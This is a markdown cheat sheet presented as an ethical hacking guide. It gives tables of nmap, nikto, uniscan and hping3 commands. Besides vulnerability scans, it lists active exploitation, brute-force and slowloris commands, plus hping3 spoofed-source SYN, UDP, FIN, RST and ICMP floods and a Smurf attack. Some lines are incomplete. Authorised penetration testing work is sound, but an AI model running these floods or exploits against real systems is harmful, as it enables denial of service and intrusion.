# This is an Ethical Testing Guide

The following Guid includes commands in the following:

* #### `nmap`

* #### `nikto`

* #### `uniscan`

* #### `hping3`


***
Author has submitted the code for educational purposes only. Author doesn't hold any responsibility for wrong usage of this intellectual property! 
<span style="color:red"> NEVER PERFORM ETHICAL HACKING WITHOUT THE WRITTEN PERMISSION FROM THE PRODUCT OWNER, YOU HAVE BEEN WARNED! </span>

***

## Nmap

Nmap is a security scanner, originally written by Gordon Lyon, used to discover hosts and services on a computer network, thus building a "map" of the network.


| Test Case | Command |
| :---: | :---: |
| Scan the target for vulnerabilities | `nmap -Pn --script vuln <target.com>` | 
| Actively exploit detected vulnerabilities | `nmap --script exploit -Pn <target.com` |
| Brute Force Passwords | `nmap --script brute -Pn <target.com>` |
| Test if target is vulnerable to DoS | `nmap --script dos -Pn <target.com>` |
| Perform DoS attack | `nmap -max-parallelism 750 -Pn --script http-slowloris --script-args` |


## Nikto

Nikto Web Scanner is a Web server scanner that tests Web servers for dangerous files/CGIs, outdated server software and other problems. It performs generic and server type specific checks. It also captures and prints any cookies received

| Test Case | Command |
| : --- : | : --- : |
| SQL Injection | `nikto -Tuning 9 -h <target.com>` |
| DoS Check | `nikto -Tuning 6 -h <target.com>` |
| Perform check on suspicious files, misconfiguration leaks, etc. | `nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host <target.com>` |

## Uniscan

Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.

| Test Case | Command |
| : --- : | : --- : |
| Perform file checks | `uniscan -u <target.com> -w` |
| Perform `robots.txt` and `sitemap.xml` checks | `uniscan -u <target.com> -e` |
| Perform Dynamic Check | `uniscan -u <target.com> -d` |
| Perform Static Check | `uniscan -u <target.com> -s` |
| Perform Stress Check | `uniscan -u <target.com> -r` |

## Hping3 

*Additional reading prior to performing actions below is strongly recommended! You have been warned!

hping is a command-line oriented TCP/IP packet assembler/analyzer. The interface is inspired to the ping(8) unix command, but hping isn’t only able to send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols, has a traceroute mode, the ability to send files between a covered channel, and many other features.

| Test Case | Command |
| : --- : | : --- : | 
| Check whether a host is alive (when PING is blocked) - sends an RST response | `hping3 -c 2 -V -p 80 -s 5050 -a <target.com>` |
| Perform DoS attack | `hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE` |
| UDP flood | `hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP` |
| TCP FIN flood | `hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP` |
| TCP RST flood | `hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP` |
| PUSH and ACK floods | `hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP` |
| ICMP and IGMP floods | `hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP` |
| Smurf attack | `hping3 --icmp --spoof TARGET_IP BROADCAST_IP` |

***
<div class="alert alert-success">
Additional studying and training is recommended below this point
</div>
***


